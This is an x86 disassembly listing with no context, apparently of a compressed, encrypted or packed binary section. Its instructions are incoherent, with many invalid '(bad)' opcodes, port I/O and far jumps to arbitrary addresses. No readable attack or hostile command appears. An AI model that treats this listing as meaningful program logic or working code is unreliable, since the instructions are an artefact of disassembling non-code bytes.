  40f466:	xlat   BYTE PTR ds:[ebx]
  40f467:	push   esi
  40f468:	add    al,0x1d
  40f46a:	aam    0xc1
  40f46c:	jo     0x40f418
  40f46e:	inc    eax
  40f46f:	out    dx,al
  40f470:	push   edx
  40f471:	loope  0x40f416
  40f473:	jmp    FWORD PTR ds:0x7db11992
  40f479:	adc    BYTE PTR [eax],0x9b
  40f47c:	mov    ecx,0xdd61ef36
  40f481:	out    0x2e,al
  40f483:	pop    ss
  40f484:	mov    cl,0x27
  40f486:	or     eax,0xd64e9791
  40f48b:	lods   eax,DWORD PTR ss:[esi]
  40f48d:	out    dx,al
  40f48e:	cwde   
  40f48f:	stos   BYTE PTR es:[edi],al
  40f490:	cli    
  40f491:	(bad)  
  40f492:	sti    
  40f493:	add    eax,0x76b23714
  40f498:	(bad)  
  40f499:	mov    cs,eax
  40f49b:	mov    dl,BYTE PTR [eax-0x7c256944]
  40f4a1:	mov    ecx,0x39df35a5
  40f4a6:	sub    al,0xc7
  40f4a8:	sub    DWORD PTR [ebp+0x4a],0x86345b11
  40f4af:	enter  0x3500,0x9c
  40f4b3:	or     eax,eax
  40f4b5:	das    
  40f4b6:	cmp    eax,0x57851ff3
  40f4bb:	sahf   
  40f4bc:	out    dx,al
  40f4bd:	xor    BYTE PTR [esp+ebp*8],0x9f
  40f4c1:	and    ch,BYTE PTR [ebx+0x42]
  40f4c4:	mov    bl,0x1f
  40f4c6:	sbb    al,0x1c
  40f4c8:	rcl    DWORD PTR [edi],1
  40f4ca:	je     0x40f517
  40f4cc:	out    0x72,al
  40f4ce:	jge    0x40f4bc
  40f4d0:	xchg   edx,eax
  40f4d1:	(bad)  
  40f4d3:	cli    
  40f4d4:	fsubr  DWORD PTR [ecx]
  40f4d6:	push   ds
  40f4d7:	add    eax,0x589c9fa5
  40f4dc:	dec    edx
  40f4dd:	call   0x6602:0x650f31a8
  40f4e4:	out    0x9a,eax
  40f4e6:	repz repz addr16 or al,0x3f
  40f4eb:	mov    ah,0xd1
  40f4ed:	xchg   eax,ecx
  40f4ef:	into   
  40f4f0:	dec    edx
  40f4f1:	leave  
  40f4f2:	or     DWORD PTR [esi+0x53],0xdb2e5457
  40f4f9:	mov    ah,0x21
  40f4fb:	inc    esi
  40f4fc:	xchg   esi,eax
  40f4fd:	push   esi
  40f4fe:	hlt    
  40f4ff:	je     0x40f4f0
  40f501:	dec    ecx
  40f502:	jmp    0x38ec5ef2
  40f507:	xchg   edi,eax
  40f508:	cmc    
  40f509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f50a:	stos   DWORD PTR es:[edi],eax
  40f50b:	jbe    0x40f4e0
  40f50d:	mov    edi,0x61e34eb3
  40f512:	pop    ebx
  40f513:	fld    TBYTE PTR [edx+0x1e]
  40f516:	ss pop es
  40f518:	mov    al,0x46
  40f51a:	call   0x7bd8d301
  40f51f:	jmp    0x40f52d
  40f521:	xor    DWORD PTR [ebx],eax
  40f523:	jo     0x40f4a6
  40f525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f527:	scas   al,BYTE PTR es:[edi]
  40f528:	push   0xffffffa1
  40f52a:	and    esp,DWORD PTR [edx+ebx*2+0x65ba6de3]
  40f531:	adc    ecx,DWORD PTR [ebx+0x10]
  40f534:	jl     0x40f5a7
  40f536:	scas   al,BYTE PTR es:[edi]
  40f537:	lea    ecx,[ebx-0x527da8e1]
  40f53d:	ins    BYTE PTR es:[edi],dx
  40f53e:	mov    ecx,0x897cf96b
  40f543:	xor    DWORD PTR [ecx],eax
  40f545:	fsubr  QWORD PTR [edi+ecx*4+0x2d]
  40f549:	sbb    ah,BYTE PTR [ebx*2-0x507320]
  40f550:	popf   
  40f551:	cmc    
  40f552:	pop    es
  40f553:	inc    ebx
  40f554:	pop    ss
  40f555:	add    eax,0x5c06ada5
  40f55a:	popa   
  40f55b:	dec    edi
  40f55c:	pop    ds
  40f55d:	aam    0x45
  40f55f:	adc    esi,DWORD PTR [edi+esi*1]
  40f562:	and    al,0x5a
  40f564:	fcom   st(1)
  40f566:	div    DWORD PTR [eax]
  40f568:	and    al,0x3d
  40f56a:	or     BYTE PTR [edx+0x70cf5a79],bl
  40f570:	sbb    al,0xe1
  40f572:	pop    ecx
  40f573:	cli    
  40f574:	pop    ds
  40f575:	mul    DWORD PTR [esp+esi*1+0x2e]
  40f579:	add    BYTE PTR ds:0x8d2961a1,ah
  40f57f:	loope  0x40f54a
  40f581:	mov    dh,0xa9
  40f583:	dec    esi
  40f584:	xlat   BYTE PTR ds:[ebx]
  40f585:	fiadd  WORD PTR [eax-0x53]
  40f588:	cmp    ch,al
  40f58a:	adc    ebx,ebp
  40f58c:	push   0xfffffff7
  40f58e:	loope  0x40f56d
  40f590:	adc    DWORD PTR [ecx-0x6b21d12c],edx
  40f596:	test   DWORD PTR [edx+0x7b24fa1a],ecx
  40f59c:	mov    edx,0xbcf72eea
  40f5a1:	dec    ebx
  40f5a2:	(bad)  [ecx]
  40f5a4:	cmp    BYTE PTR [ebx+0x6cf91a9a],bl
  40f5aa:	xor    cl,bh
  40f5ac:	push   ebp
  40f5ad:	xchg   ebp,eax
  40f5ae:	or     al,0x87
  40f5b0:	inc    DWORD PTR [ebp+0x6de23439]
  40f5b6:	adc    dl,BYTE PTR [ebx+0x58694f1c]
  40f5bc:	(bad)  
  40f5bd:	dec    dl
  40f5bf:	push   ss
  40f5c0:	dec    esi
  40f5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5c2:	js     0x40f596
  40f5c4:	jns    0x40f5cc
  40f5c6:	(bad)  
  40f5c7:	and    ch,dl
  40f5c9:	scas   eax,DWORD PTR es:[edi]
  40f5ca:	cmp    dh,bl
  40f5cc:	xor    dh,bl
  40f5ce:	fild   QWORD PTR [esi]
  40f5d0:	bound  eax,QWORD PTR [ecx+edx*2+0x2627f562]
  40f5d7:	mov    al,ds:0x790e53f2
  40f5dc:	out    dx,eax
  40f5dd:	xchg   cl,bh
  40f5df:	sbb    dl,bh
  40f5e1:	cwde   
  40f5e2:	cmp    ch,BYTE PTR [ebp-0x38]
  40f5e5:	mov    ebx,DWORD PTR [edx]
  40f5e7:	scas   al,BYTE PTR es:[edi]
  40f5e8:	dec    eax
  40f5e9:	int3   
  40f5ea:	fld    TBYTE PTR [esi+0x315772fa]
  40f5f0:	stc    
  40f5f1:	xchg   esi,eax
  40f5f2:	ds xor eax,ecx
  40f5f5:	sub    edi,DWORD PTR [esi+0x56]
  40f5f8:	jge    0x40f59a
  40f5fa:	scas   al,BYTE PTR es:[edi]
  40f5fb:	shl    esi,1
  40f5fd:	idiv   DWORD PTR [edi-0x1f]
  40f600:	push   ebp
  40f601:	test   DWORD PTR [ebx+0x72],0xf46ae61f
  40f608:	and    ebp,DWORD PTR [ebp-0x3f60dca3]
  40f60e:	dec    esi
  40f60f:	and    eax,0x2dae367f
  40f614:	lock mov cl,0x2c
  40f617:	xchg   DWORD PTR [eax+0x54af8a86],ebx
  40f61d:	push   cs
  40f61e:	(bad)  [edi+0x69f4a0e2]
  40f624:	arpl   WORD PTR [edi+0x2c],bx
  40f627:	adc    eax,0xb070674a
  40f62c:	out    0xd,al
  40f62e:	addr16 aaa 
  40f630:	imul   ecx,DWORD PTR [esi],0xd5a76198
  40f636:	popa   
  40f637:	pushfw 
  40f639:	loop   0x40f5f4
  40f63b:	mov    eax,0x2117007
  40f640:	in     al,0xde
  40f642:	xor    bh,bh
  40f644:	adc    DWORD PTR [ecx+0x772777fd],esi
  40f64a:	mov    edi,0x87762adc
  40f64f:	jnp    0x40f62c
  40f651:	test   DWORD PTR [eax+0x2d],ebx
  40f654:	out    0xff,al
  40f656:	and    bl,dl
  40f658:	(bad)  
  40f65a:	loopne 0x40f5ec
  40f65c:	or     esp,DWORD PTR [edi]
  40f65e:	fadd   st(6),st
  40f660:	enter  0xef1a,0x91
  40f664:	retf   
  40f665:	xchg   esp,eax
  40f666:	sub    al,0x6f
  40f668:	adc    al,0x66
  40f66a:	and    al,0xab
  40f66c:	and    BYTE PTR [esi+0x24],dh
  40f66f:	arpl   dx,sp
  40f671:	lock dec ebp
  40f673:	stos   DWORD PTR es:[edi],eax
  40f674:	in     al,0xb5
  40f676:	retf   0x83fa
  40f679:	and    eax,0x3ffa2f8d
  40f67e:	and    eax,0x5fb8dbd
  40f683:	or     al,0x50
  40f685:	int3   
  40f686:	dec    esi
  40f687:	mov    ds:0xad0b8289,eax
  40f68c:	xchg   ebp,eax
  40f68d:	test   al,0x85
  40f68f:	mov    eax,ds:0xabff9d05
  40f694:	aaa    
  40f695:	jno    0x40f642
  40f697:	out    0xb2,al
  40f699:	pop    ss
  40f69a:	xchg   esp,eax
  40f69b:	sbb    al,0xe2
  40f69d:	dec    esi
  40f69e:	cdq    
  40f69f:	cmp    dh,BYTE PTR [edx-0x55]
  40f6a2:	call   0xc873c925
  40f6a7:	mov    dl,0xee
  40f6a9:	enter  0x20d7,0x91
  40f6ad:	hlt    
  40f6ae:	xlat   BYTE PTR ds:[ebx]
  40f6af:	sahf   
  40f6b0:	daa    
  40f6b1:	jae    0x40f6e8
  40f6b3:	pop    ebx
  40f6b4:	mov    ecx,0x2763578a
  40f6b9:	gs test ebp,ebx
  40f6bc:	(bad)
  40f6c0:	mov    esi,0xdfe12dd3
  40f6c5:	or     eax,0x619c5e98
  40f6ca:	sub    BYTE PTR [esi+0x3c],ch
  40f6cd:	inc    edi
  40f6ce:	ja     0x40f680
  40f6d0:	xor    al,0xeb
  40f6d2:	ret    
  40f6d3:	iret   
  40f6d4:	push   ss
  40f6d5:	in     al,dx
  40f6d6:	js     0x40f735
  40f6d8:	or     bl,cl
  40f6da:	jne    0x40f6a6
  40f6dc:	cmp    DWORD PTR [edx-0x72],edx
  40f6df:	ins    DWORD PTR es:[edi],dx
  40f6e0:	data16 jns 0x40f6bf
  40f6e3:	push   esi
  40f6e4:	jmp    0x56d9:0xbfeeef39
  40f6eb:	lock jbe 0x40f6d2
  40f6ee:	imul   eax,DWORD PTR [esi+0x0],0x4a
  40f6f2:	xor    DWORD PTR [eax+0x15],ecx
  40f6f5:	sbb    esi,DWORD PTR ds:0xabe83e92
  40f6fb:	push   0xffffff81
  40f6fd:	jmp    0x40f6dd
  40f6ff:	or     esi,DWORD PTR [edi]
  40f701:	lock pop edi
  40f703:	adc    al,0x64
  40f705:	test   eax,0xd7c83dc6
  40f70a:	rol    DWORD PTR [ebx+0x5e],cl
  40f70d:	nop
  40f70e:	das    
  40f70f:	push   ss
  40f710:	xchg   edx,eax
  40f711:	push   edx
  40f712:	pop    eax
  40f713:	mov    bh,BYTE PTR [esi+0x2e]
  40f716:	dec    ebp
  40f717:	dec    edi
  40f718:	mov    dl,0x3
  40f71a:	pop    es
  40f71b:	loop   0x40f6bc
  40f71d:	clc    
  40f71e:	add    eax,0x3a5f2a79
  40f723:	cmp    eax,0x494d764a
  40f728:	pusha  
  40f729:	jae    0x40f788
  40f72b:	xor    BYTE PTR [ebx],dl
  40f72d:	fsubr  DWORD PTR [edx+0x35a83049]
  40f733:	xchg   DWORD PTR ds:0x2b58b820,edx
  40f739:	sbb    ebp,edi
  40f73b:	aas    
  40f73c:	(bad)  
  40f73e:	pop    ebx
  40f73f:	xchg   ebx,eax
  40f740:	std    
  40f741:	cmova  ebp,DWORD PTR [esi]
  40f744:	mov    cs,WORD PTR [ecx-0x4d]
  40f747:	mov    ebx,0x4f606ef4
  40f74c:	mov    ds:0x85da8038,al
  40f751:	push   edi
  40f752:	pop    ebp
  40f753:	jp     0x40f793
  40f755:	mov    esi,0x5bf66da3
  40f75a:	mov    esi,0x9afcfa2a
  40f75f:	scas   al,BYTE PTR es:[edi]
  40f760:	imul   eax,DWORD PTR [ecx-0x3626a24d],0xb1c34424
  40f76a:	cmp    esp,DWORD PTR [eax-0x47d62c00]
  40f770:	sbb    DWORD PTR [ecx-0x5f],esp
  40f773:	mov    esp,0xc24412d9
  40f778:	mov    al,0x72
  40f77a:	push   DWORD PTR [esi-0x7b]
  40f77d:	jmp    0x55b8:0xa1b024b8
  40f784:	pop    ss
  40f785:	dec    esi
  40f786:	(bad)  
  40f787:	jns    0x40f742
  40f789:	jmp    0x6caf7a59
  40f78e:	repnz outs dx,BYTE PTR ds:[esi]
  40f790:	push   ds
  40f791:	shr    BYTE PTR [eax-0x66],1
  40f794:	loopne 0x40f778
  40f796:	fild   WORD PTR [edx-0x229b48a4]
  40f79c:	imul   ebx,edx,0xf4153952
  40f7a2:	push   es
  40f7a3:	mov    ebx,0xaf8e7392
  40f7a8:	xlat   BYTE PTR ds:[ebx]
  40f7a9:	inc    ecx
  40f7aa:	mov    ebx,0xbf69d2e4
  40f7af:	iret   
  40f7b0:	add    eax,0x6adb4345
  40f7b5:	pushf  
  40f7b6:	push   ecx
  40f7b7:	add    al,0xae
  40f7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7ba:	push   ss
  40f7bb:	aaa    
  40f7bc:	out    dx,al
  40f7bd:	nop
  40f7be:	rcl    DWORD PTR [edi],0x1d
  40f7c1:	add    BYTE PTR [eax-0x5a],al
  40f7c4:	and    al,0xd
  40f7c6:	sub    DWORD PTR [ebx],edi
  40f7c8:	and    DWORD PTR [ecx+ecx*8],eax
  40f7cb:	js     0x40f82e
  40f7cd:	mov    ds:0xc9b4445,al
  40f7d2:	xor    ebx,0x252dc5c5
  40f7d8:	sbb    DWORD PTR fs:[edi+0x40],ebp
  40f7dc:	mov    ah,0x0
  40f7de:	pop    esp
  40f7df:	das    
  40f7e0:	aas    
  40f7e1:	xor    ah,BYTE PTR [esi-0xa153abb]
  40f7e7:	sti    
  40f7e8:	js     0x40f826
  40f7ea:	push   ecx
  40f7eb:	mov    cl,0x30
  40f7ed:	mov    ebp,0x2a4c7cd8
  40f7f2:	test   DWORD PTR [edi-0x19407377],edx
  40f7f8:	mov    bh,0xee
  40f7fa:	gs gs cmp eax,0xd4a09797
  40f801:	jo     0x40f7e8
  40f803:	(bad)  
  40f804:	mov    bl,0xcb
  40f806:	inc    BYTE PTR [eax]
  40f808:	inc    ebp
  40f809:	sub    eax,0x2ff2edfe
  40f80e:	mov    fs,WORD PTR [esi+eax*4-0x6a]
  40f812:	jg     0x40f7f5
  40f814:	mov    ds:0xbf51352f,eax
  40f819:	ins    DWORD PTR es:[edi],dx
  40f81a:	mov    ebx,0x10d81545
  40f81f:	(bad)  
  40f820:	fwait
  40f821:	fwait
  40f822:	push   ebp
  40f823:	es cmp eax,0x7d18e944
  40f829:	popf   
  40f82a:	pop    esi
  40f82b:	outs   dx,DWORD PTR ds:[esi]
  40f82c:	or     eax,0xd28ccde5
  40f831:	pop    es
  40f832:	xor    DWORD PTR [esi],ecx
  40f834:	and    BYTE PTR [esi],ch
  40f836:	xchg   esp,ebx
  40f838:	push   edi
  40f839:	add    al,al
  40f83b:	push   edx
  40f83c:	pop    ss
  40f83d:	adc    al,0x70
  40f83f:	add    dh,dl
  40f841:	xchg   edi,eax
  40f842:	repz aas 
  40f844:	dec    ecx
  40f845:	inc    ecx
  40f846:	add    bl,ch
  40f848:	ret    0x5695
  40f84b:	adc    BYTE PTR [ebp+0x86ef081],bl
  40f851:	adc    eax,0x19ad67de
  40f856:	dec    edx
  40f857:	add    ebx,DWORD PTR [eax]
  40f859:	push   edi
  40f85a:	out    dx,al
  40f85b:	mov    ds:0xca752696,eax
  40f860:	sub    BYTE PTR [esi],bh
  40f862:	iret   
  40f863:	mov    edx,DWORD PTR [ebx-0x76]
  40f866:	add    dl,dl
  40f868:	and    BYTE PTR [esi-0x3c],bl
  40f86b:	aaa    
  40f86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f86d:	je     0x40f853
  40f86f:	mov    ah,0x3e
  40f871:	xchg   edx,eax
  40f872:	retf   
  40f873:	ss pushf 
  40f875:	and    dh,BYTE PTR [esi+0x2]
  40f878:	retf   
  40f879:	fistp  DWORD PTR [eax+0x44]
  40f87c:	pushf  
  40f87d:	pop    esi
  40f87e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f87f:	in     eax,dx
  40f880:	sbb    edi,DWORD PTR [edi+edi*4]
  40f883:	cmp    eax,0xa2e45480
  40f888:	jge    0x40f896
  40f88a:	and    ch,BYTE PTR [ecx*8-0x47c233ff]
  40f891:	loopne 0x40f861
  40f893:	mov    es,WORD PTR [eax-0x6c]
  40f896:	sbb    eax,esi
  40f898:	sbb    dl,BYTE PTR [edx-0x64]
  40f89b:	fld    QWORD PTR [ebx+0x7bf72a07]
  40f8a1:	(bad)  
  40f8a2:	jecxz  0x40f8c4
  40f8a4:	iret   
  40f8a5:	add    DWORD PTR [esi-0x4fada129],ecx
  40f8ab:	push   0x25
  40f8ad:	adc    BYTE PTR [eax+esi*8+0x57da9bc9],ah
  40f8b4:	inc    eax
  40f8b5:	cmp    dh,BYTE PTR [esi+0x22]
  40f8b8:	push   edx
  40f8b9:	mov    WORD PTR [edi-0x5e94a646],ds
  40f8bf:	and    bh,BYTE PTR ds:0x52675f70
  40f8c5:	cdq    
  40f8c6:	xor    DWORD PTR [ebx+0x31],0xffffff8b
  40f8ca:	lock sub al,0x73
  40f8cd:	out    dx,al
  40f8ce:	sub    DWORD PTR [ebx],eax
  40f8d0:	(bad)  
  40f8d1:	outs   dx,DWORD PTR ds:[esi]
  40f8d2:	lahf   
  40f8d3:	adc    BYTE PTR [eax+0x14ae0c49],cl
  40f8d9:	in     al,dx
  40f8da:	adc    al,0x10
  40f8dc:	lea    edx,[ecx]
  40f8de:	sub    esi,DWORD PTR [edi+0x104bbbe3]
  40f8e4:	cmc    
  40f8e5:	mov    eax,ds:0x82d98564
  40f8ea:	ins    DWORD PTR es:[edi],dx
  40f8eb:	call   0x57e9:0x658a3b69
  40f8f2:	dec    ebp
  40f8f3:	lods   al,BYTE PTR ds:[esi]
  40f8f4:	cwde   
  40f8f5:	fdivr  QWORD PTR [edi+0x61]
  40f8f8:	sub    edi,eax
  40f8fa:	mov    bh,0x91
  40f8fc:	push   es
  40f8fd:	adc    BYTE PTR [ecx],ah
  40f8ff:	mov    cl,0x7d
  40f901:	xchg   ecx,eax
  40f902:	sbb    eax,DWORD PTR [edx-0x1391ae18]
  40f908:	pop    ebx
  40f909:	mov    al,0x5d
  40f90b:	clc    
  40f90c:	add    DWORD PTR [ebx-0x3b3e000b],ebx
  40f912:	mov    ch,0xc1
  40f914:	dec    ebp
  40f915:	pop    es
  40f916:	mov    ebx,0x5e3757e6
  40f91b:	idiv   BYTE PTR [ecx-0x5dbc0b94]
  40f921:	mov    esp,0x9e9c63ae
  40f926:	sub    ecx,ecx
  40f928:	cmp    eax,0x101e84d7
  40f92d:	sub    ah,BYTE PTR [ebx]
  40f92f:	inc    ebx
  40f930:	dec    edi
  40f931:	das    
  40f932:	lock stos DWORD PTR es:[edi],eax
  40f934:	call   0xf552478a
  40f939:	mov    edi,0xac40f89f
  40f93e:	icebp  
  40f93f:	addr16 iret 
  40f941:	cld    
  40f942:	retf   
  40f943:	jo     0x40f91c
  40f945:	or     BYTE PTR [ebp-0x24],dh
  40f948:	sahf   
  40f949:	xchg   edi,eax
  40f94a:	retf   
  40f94b:	add    dl,BYTE PTR [ecx+0x49]
  40f94e:	pop    edi
  40f94f:	addr16 adc eax,0xf8984d4c
  40f955:	sti    
  40f956:	adc    BYTE PTR [edi+0x6745224d],0xcb
  40f95d:	aad    0x7c
  40f95f:	sbb    esp,DWORD PTR [esp+ebp*2+0x56]
  40f963:	jmp    0xc90dbc63
  40f968:	out    dx,eax
  40f969:	nop
  40f96a:	inc    edi
  40f96b:	adc    al,BYTE PTR [edx-0x4344b0cb]
  40f971:	adc    al,0x95
  40f973:	jmp    0x3a6a:0xd829efcf
  40f97a:	jmp    0x40f917
  40f97c:	pop    esp
  40f97d:	popa   
  40f97e:	icebp  
  40f97f:	jle    0x40f908
  40f981:	mov    edx,0x735ef59
  40f986:	adc    dh,dl
  40f988:	ins    BYTE PTR es:[edi],dx
  40f989:	push   0x90555505
  40f98e:	and    al,0x20
  40f990:	fs out dx,eax
  40f992:	not    al
  40f994:	imul   esp,DWORD PTR [eax],0xffffff81
  40f997:	mov    dh,0x51
  40f999:	xlat   BYTE PTR ds:[ebx]
  40f99a:	sbb    DWORD PTR [edx],edi
  40f99c:	cdq    
  40f99d:	popf   
  40f99e:	jmp    0x40f9b5
  40f9a0:	cmp    ebp,ebx
  40f9a2:	in     eax,dx
  40f9a3:	and    BYTE PTR [ebx+0x6c254d8e],dh
  40f9a9:	ss xchg edi,eax
  40f9ab:	mov    ebp,0x3245f9c5
  40f9b0:	pop    ecx
  40f9b1:	fcmovu st,st(5)
  40f9b3:	pushf  
  40f9b4:	stos   DWORD PTR es:[edi],eax
  40f9b5:	mov    ah,0x9f
  40f9b7:	aam    0x5b
  40f9b9:	enter  0x377,0x8e
  40f9bd:	xlat   BYTE PTR ds:[ebx]
  40f9be:	pop    esp
  40f9c0:	aad    0xa5
  40f9c2:	mov    esp,0x102cc657
  40f9c7:	sub    DWORD PTR [ebx+0x5ca4c61],0x427729c9
  40f9d1:	test   BYTE PTR [eax+edx*8-0x3f403783],cl
  40f9d8:	(bad)  
  40f9d9:	adc    bh,BYTE PTR [esi]
  40f9db:	ss pop ebp
  40f9dd:	adc    DWORD PTR [edx],esi
  40f9df:	pop    ebp
  40f9e0:	fld    QWORD PTR [ecx-0x1e]
  40f9e3:	cs loope 0x40f9eb
  40f9e6:	les    eax,FWORD PTR [ebx]
  40f9e8:	loop   0x40fa60
  40f9ea:	lds    ecx,FWORD PTR [ecx-0x617f246a]
  40f9f0:	add    BYTE PTR [edx+0x9],cl
  40f9f3:	stc    
  40f9f4:	push   ebp
  40f9f5:	(bad)  
  40f9f6:	ja     0x40fa05
  40f9f8:	in     eax,dx
  40f9f9:	or     DWORD PTR [edi],edi
  40f9fb:	xchg   ebp,eax
  40f9fc:	xor    edx,eax
  40f9fe:	pop    ebp
  40f9ff:	(bad)  
  40fa00:	aas    
  40fa01:	sub    DWORD PTR [esi+0x68],esi
  40fa04:	pop    ss
  40fa05:	rcl    BYTE PTR [esi],0x6e
  40fa08:	pusha  
  40fa09:	ins    BYTE PTR es:[edi],dx
  40fa0a:	in     eax,dx
  40fa0b:	xor    BYTE PTR [esi],0x80
  40fa0e:	int3   
  40fa0f:	or     ah,al
  40fa11:	xor    BYTE PTR [ebx+0x19f0b734],dh
  40fa17:	es jge 0x40fa04
  40fa1a:	xchg   ebp,eax
  40fa1b:	scas   eax,DWORD PTR es:[edi]
  40fa1c:	push   esp
  40fa1d:	stos   DWORD PTR es:[edi],eax
  40fa1e:	jbe    0x40fa6f
  40fa20:	repnz sahf 
  40fa22:	xor    DWORD PTR [ecx],edi
  40fa24:	ins    BYTE PTR es:[edi],dx
  40fa25:	sub    BYTE PTR [ecx],0x5e
  40fa28:	push   ecx
  40fa29:	and    DWORD PTR [esi-0x23],edi
  40fa2c:	dec    ebp
  40fa2d:	mov    dl,0x9f
  40fa2f:	clc    
  40fa30:	dec    edx
  40fa31:	shr    DWORD PTR [ecx+0x59e55719],0x15
  40fa38:	cli    
  40fa39:	jmp    0x4c3b:0xad48ad94
  40fa40:	push   eax
  40fa41:	ret    0x28c
  40fa44:	lods   eax,DWORD PTR ds:[esi]
  40fa45:	inc    ecx
  40fa46:	rcl    BYTE PTR ds:0x53837dad,cl
  40fa4c:	jae    0x40fa18
  40fa4e:	sar    ecx,cl
  40fa50:	sbb    al,0xf9
  40fa52:	xor    al,0x4e
  40fa54:	push   esp
  40fa55:	pop    ds
  40fa56:	or     ah,BYTE PTR [edx-0x296e3404]
  40fa5c:	fs mov ebp,0x2e64a970
  40fa62:	push   esi
  40fa63:	cmp    BYTE PTR ds:0x68a858b5,0x87
  40fa6a:	push   es
  40fa6b:	int    0xcf
  40fa6d:	pushf  
  40fa6e:	and    esi,DWORD PTR [eax]
  40fa70:	ret    0x126
  40fa73:	ror    DWORD PTR [eax],cl
  40fa75:	das    
  40fa76:	pop    esi
  40fa77:	xor    DWORD PTR [ebx+esi*8],edi
  40fa7a:	adc    BYTE PTR [esi+0x5a],dl
  40fa7d:	js     0x40fa08
  40fa7f:	sub    eax,0xfb8b9e29
  40fa84:	leave  
  40fa85:	push   esp
  40fa86:	and    eax,0x8aab9ea
  40fa8b:	add    dl,ch
  40fa8d:	cdq    
  40fa8e:	test   BYTE PTR [esi],ch
  40fa90:	sub    al,0xb7
  40fa92:	in     al,dx
  40fa93:	pop    ss
  40fa94:	es dec ebp
  40fa96:	ss adc eax,0xe0062772
  40fa9c:	lods   al,BYTE PTR ds:[esi]
  40fa9d:	mov    al,0x1
  40fa9f:	jle    0x40fafd
  40faa1:	adc    ax,0x3a49
  40faa5:	and    al,0xeb
  40faa7:	pop    ss
  40faa8:	jle    0x40faa8
  40faaa:	aas    
  40faab:	dec    esp
  40faac:	enter  0x4232,0x70
  40fab0:	jmp    0x852d:0xd1d3bd3e
  40fab7:	xlat   BYTE PTR ds:[ebx]
  40fab8:	cmc    
  40fab9:	enter  0xab92,0x15
  40fabd:	or     al,0x8f
  40fabf:	and    BYTE PTR [ebx-0x34],dl
  40fac2:	mov    ebp,0x9ed21308
  40fac7:	pop    ss
  40fac8:	adc    dh,cl
  40faca:	pop    edi
  40facb:	mov    ds:0x1ecbf671,al
  40fad0:	(bad)  
  40fad1:	daa    
  40fad2:	lahf   
  40fad3:	add    eax,0x4a2ee3d7
  40fad8:	sar    ebp,cl
  40fada:	mov    dh,0x39
  40fadc:	or     al,0x54
  40fade:	sbb    al,0xb4
  40fae0:	inc    esp
  40fae1:	inc    ecx
  40fae2:	sub    bl,BYTE PTR [ebx-0x1c]
  40fae5:	jb     0x40fafb
  40fae7:	xchg   ecx,eax
  40fae8:	sbb    eax,0x6096651a
  40faed:	and    BYTE PTR [ecx-0x624a7174],bh
  40faf3:	push   esp
  40faf4:	push   ecx
  40faf5:	cmp    al,0xf8
  40faf7:	imul   ebp,ebx,0x384d6037
  40fafd:	cdq    
  40fafe:	jno    0x40fb60
  40fb00:	pop    ss
  40fb01:	sbb    al,0x7d
  40fb03:	fsubr  st(4),st
  40fb05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb06:	or     al,0xdc
  40fb08:	dec    edx
  40fb09:	jo     0x40fb5b
  40fb0b:	lods   eax,DWORD PTR ds:[esi]
  40fb0c:	ss into 
  40fb0e:	in     eax,0x78
  40fb10:	dec    ecx
  40fb11:	lea    ebx,[ebx+0x13]
  40fb14:	pop    es
  40fb15:	jl     0x40faad
  40fb17:	inc    esp
  40fb18:	enter  0x178c,0xf1
  40fb1c:	dec    ebp
  40fb1d:	push   ebp
  40fb1e:	popf   
  40fb1f:	ins    DWORD PTR es:[edi],dx
  40fb20:	out    0x2,eax
  40fb22:	jmp    0x40fb78
  40fb24:	outs   dx,BYTE PTR ds:[esi]
  40fb25:	sub    bl,BYTE PTR [edx+ecx*8-0x4b]
  40fb29:	ja     0x40fac2
  40fb2b:	mov    ecx,0xf3e6b5fa
  40fb30:	(bad)  
  40fb32:	lock xor eax,0x9f9bd1ef
  40fb38:	retf   0x4ac8
  40fb3b:	push   ebp
  40fb3c:	jae    0x40fb7f
  40fb3e:	mov    cl,0xe2
  40fb40:	(bad)  
  40fb41:	loope  0x40fb57
  40fb43:	and    BYTE PTR [eax-0x28],ch
  40fb46:	repz hlt 
  40fb48:	daa    
  40fb49:	popf   
  40fb4a:	mov    ds:0xd5b8b82c,al
  40fb4f:	(bad)  [ebp-0x62d5001f]
  40fb55:	add    dl,BYTE PTR [ebx-0x51]
  40fb58:	or     al,0x54
  40fb5a:	add    BYTE PTR [eax+0x3ffa57ee],bl
  40fb60:	js     0x40fafd
  40fb62:	shr    DWORD PTR [esi-0x6b95d522],1
  40fb68:	xchg   DWORD PTR [ecx-0x6d79599f],ecx
  40fb6e:	pop    edx
  40fb6f:	cmp    eax,0x141f2490
  40fb74:	xchg   edi,eax
  40fb75:	pop    ds
  40fb76:	push   0x20c19414
  40fb7b:	cs dec esp
  40fb7d:	jno    0x40fb4b
  40fb7f:	sub    DWORD PTR [esi-0x68c36987],eax
  40fb85:	jmp    0xe1179451
  40fb8a:	es or  eax,0xf88a2ecb
  40fb90:	cmp    eax,DWORD PTR [eax+0x1557b57e]
  40fb96:	xchg   esi,eax
  40fb97:	shl    BYTE PTR [ebx-0x5d],0x82
  40fb9b:	nop
  40fb9c:	add    ebp,DWORD PTR [edi]
  40fb9e:	jae    0x40fb63
  40fba0:	outs   dx,DWORD PTR ds:[esi]
  40fba1:	repnz mov edx,0x57642671
  40fba7:	jge    0x40fbfd
  40fba9:	(bad)  
  40fbaa:	jmp    0x40fba1
  40fbac:	cmp    al,0x12
  40fbae:	inc    esi
  40fbaf:	(bad)  
  40fbb0:	std    
  40fbb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb2:	hlt    
  40fbb3:	mov    al,ds:0xf742176e
  40fbb8:	je     0x40fbf9
  40fbba:	mov    esi,0x6961b577
  40fbbf:	jbe    0x40fc1d
  40fbc1:	int    0x25
  40fbc3:	lock aad 0xd1
  40fbc6:	dec    edi
  40fbc7:	aas    
  40fbc8:	fidivr WORD PTR [edi+0x64fa069c]
  40fbce:	cmc    
  40fbcf:	add    BYTE PTR [edx],0x99
  40fbd2:	sahf   
  40fbd3:	add    ah,BYTE PTR [esi]
  40fbd5:	xchg   ah,bl
  40fbd7:	fidivr DWORD PTR [eax-0x756e42ad]
  40fbdd:	retf   
  40fbde:	call   0xc27dda07
  40fbe3:	cmp    bh,bh
  40fbe5:	in     eax,dx
